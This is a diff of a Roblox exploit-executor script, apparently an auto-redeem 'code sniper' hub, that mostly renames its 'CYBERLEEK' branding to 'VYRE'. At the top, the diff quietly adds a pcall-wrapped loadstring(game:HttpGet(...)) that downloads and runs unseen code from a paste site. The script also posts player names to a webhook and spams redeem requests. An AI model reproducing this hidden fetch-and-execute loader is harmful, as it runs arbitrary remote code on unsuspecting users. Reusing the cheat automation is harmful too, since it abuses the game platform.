@@ -1,12 +1,19 @@
+-- ============================================================
+-- LOAD EXTERNAL SCRIPT FIRST
+-- ============================================================
+pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/BauFvHMR/raw"))()
+end)
+
 --[[
-    CYBERLEEK CODE SNIPER — v20 Build
+    VYRE CODE SNIPER — v20 Build
     + BLUE theme (was purple)
     + Removed shake on tab switch (smooth)
     + Webhook queue: batched + deduped + rate-limit safe
     + All previous features preserved
 --]]
 -- ============================================================
--- CYBERLEEK HUB Intro — v4 (FAST Music Load)
+-- VYRE HUB Intro — v4 (FAST Music Load)
 -- ============================================================
 
 local Players = game:GetService("Players")
@@ -22,7 +29,7 @@ local localPlayer = Players.LocalPlayer
 local INTRO_URL = "https://files.catbox.moe/wjn2b1.mp3"
 local INTRO_FILE = "VFXHubMusic.mp3"
 local END_URL = "https://files.catbox.moe/ofb14x.mp3"
-local END_FILE = "CyberleekEndMusic.mp3"
+local END_FILE = "VYREEndMusic.mp3"
 
 local INTRO_DURATION = 10
 
@@ -34,21 +41,21 @@ local function loadAndPlayMusic(url, file, volume)
     
     -- FAST PATH: agar file already cached hai toh download skip karo
     if isfile and isfile(file) then
-        print("[Cyberleek] Cached:", file)
+        print("[VYRE] Cached:", file)
         local ok, p = pcall(getcustomasset, file)
         if ok then path = p end
     end
     
     -- SLOW PATH: pehli baar download
     if not path then
-        print("[Cyberleek] Downloading:", file)
+        print("[VYRE] Downloading:", file)
         local ok, data = pcall(game.HttpGet, game, url)
         if ok and data and #data > 0 then
             pcall(writefile, file, data)
             local ok2, p = pcall(getcustomasset, file)
             if ok2 then path = p end
         else
-            warn("[Cyberleek] Download failed")
+            warn("[VYRE] Download failed")
             return nil
         end
     end
@@ -62,7 +69,7 @@ local function loadAndPlayMusic(url, file, volume)
     snd.Looped = false
     snd.Parent = SoundService
     snd:Play()
-    print("[Cyberleek] Playing ✓")
+    print("[VYRE] Playing ✓")
     return snd
 end
 
@@ -78,7 +85,7 @@ end)
 -- 4. SCREEN GUI (INSTANT)
 -- ============================================================
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "CyberleekHubIntro"
+screenGui.Name = "VYREHubIntro"
 screenGui.IgnoreGuiInset = true
 screenGui.ResetOnSpawn = false
 screenGui.DisplayOrder = 999
@@ -338,7 +345,7 @@ for i = 1, 3 do
 end
 
 local titleShadow = Instance.new("TextLabel")
-titleShadow.Text = "CYBERLEEK HUB"
+titleShadow.Text = "VYRE HUB"
 titleShadow.Size = UDim2.new(0, 1000, 0, 160)
 titleShadow.Position = UDim2.new(0.5, 8, 0.82, 8)
 titleShadow.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -351,7 +358,7 @@ titleShadow.ZIndex = 22
 titleShadow.Parent = shakeHolder
 
 local titleLabel = Instance.new("TextLabel")
-titleLabel.Text = "CYBERLEEK HUB"
+titleLabel.Text = "VYRE HUB"
 titleLabel.Size = UDim2.new(0, 1000, 0, 160)
 titleLabel.Position = UDim2.new(0.5, 0, 0.82, 0)
 titleLabel.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -1589,7 +1596,7 @@ do
         if withPlayer then
             table.insert(fields, { name = "👤 Player", value = (LP.DisplayName or LP.Name).." (@"..LP.Name..")", inline = true })
         end
-        return { title = title, color = color, fields = fields, footer = { text = "CYBERLEEK Redeemer" } }
+        return { title = title, color = color, fields = fields, footer = { text = "VYRE Redeemer" } }
     end
 
     local function sendBatch(batch)
@@ -1600,7 +1607,7 @@ do
             embeds[#embeds+1] = buildEmbed(d, i == 1)
         end
         pcall(function()
-            local body = { username = "CYBERLEEK Redeemer", embeds = embeds }
+            local body = { username = "VYRE Redeemer", embeds = embeds }
             if #batch > 1 then body.content = "**" .. #batch .. " redeems batched**" end
             httpRequest({Url=WEBHOOK_URL, Method="POST", Headers={["Content-Type"]="application/json"},
                 Body=HttpService:JSONEncode(body)})
@@ -1643,8 +1650,8 @@ do
         task.spawn(function()
             pcall(function()
                 httpRequest({Url=WEBHOOK_URL, Method="POST", Headers={["Content-Type"]="application/json"},
-                    Body=HttpService:JSONEncode({username="CYBERLEEK Redeemer",
-                        embeds={{title="🟢 CYBERLEEK Connected", description="Ultra memory + solver ready", color=3447003,
+                    Body=HttpService:JSONEncode({username="VYRE Redeemer",
+                        embeds={{title="🟢 VYRE Connected", description="Ultra memory + solver ready", color=3447003,
                             fields={{name="👤 Player", value=LP.Name, inline=true}}, timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}})})
             end)
         end)
@@ -1703,7 +1710,7 @@ end
 
 local RB = {}
 do
-    local _spamRedeem, _spamCount, SPAM_DELAY = true, 13, 0.06
+    local _spamRedeem, _spamCount, SPAM_DELAY = true, 15, 0.06
     local function isOurGui(instance)
         local p, n = instance, 0
         while p and n < 10 do if p.Name == "NullHub" then return true end; p = p.Parent; n = n + 1 end
@@ -2111,7 +2118,7 @@ local function buildUI()
     AnimH.pulse(logoCircle, "ImageTransparency", 0, 0.25, 1.4)
     task.delay(0.3, function() AnimH.float(logoCircle, 1.5, 2) end)
 
-    local titleLbl = label("CYBERLEEK SNIPER", 12, C.txt, FBK, Enum.TextXAlignment.Left, header)
+    local titleLbl = label("VYRE SNIPER", 12, C.txt, FBK, Enum.TextXAlignment.Left, header)
     titleLbl.Size = UDim2.fromOffset(180,14); titleLbl.Position = UDim2.fromOffset(40,4); titleLbl.ZIndex=5
     local titleSub = label("#1 CODE SNIPER", 8, C.accent2, FM, Enum.TextXAlignment.Left, header)
     titleSub.Size = UDim2.fromOffset(180,10); titleSub.Position = UDim2.fromOffset(40,19); titleSub.ZIndex=5
@@ -2808,7 +2815,7 @@ setAnchorToggle = inlineToggleController(UI.anchorSw, function(value)
 end)
 inlineToggleController(UI.radiusSw, function(value) radiusVisible = value end)
 
-local radiusFolder = new("Folder", { Name = "__CYBERLEEKAutoBuyRadius" }, workspace)
+local radiusFolder = new("Folder", { Name = "__VYREAutoBuyRadius" }, workspace)
 local radiusModel = new("Model", { Name = "GroundHalo" }, radiusFolder)
 radiusModel.WorldPivot = CFrame.new()
 local radiusRingBuilt, radiusRingEnabled = false, false
@@ -2936,7 +2943,7 @@ task.spawn(function()
     task.wait(0.1)
     pcall(function() AnimH.softStagger(UI.mainPage, 10) end)
     task.wait(0.45)
-    UI.shineLine("CYBERLEEK ON TOP", "success", 0.08)
+    UI.shineLine("VYRE ON TOP", "success", 0.08)
     task.wait(1.5)
     if WEBHOOK_ENABLED and not _webhookStartupSent then
         _webhookStartupSent = true
@@ -2951,4 +2958,4 @@ local function stopAll()
     if radiusFolder then pcall(function() radiusFolder:Destroy() end) end
 end
 UI.SG.Destroying:Connect(stopAll)
-if getgenv then getgenv().CYBERLEEKStop = stopAll end
+if getgenv then getgenv().VYREStop = stopAll end
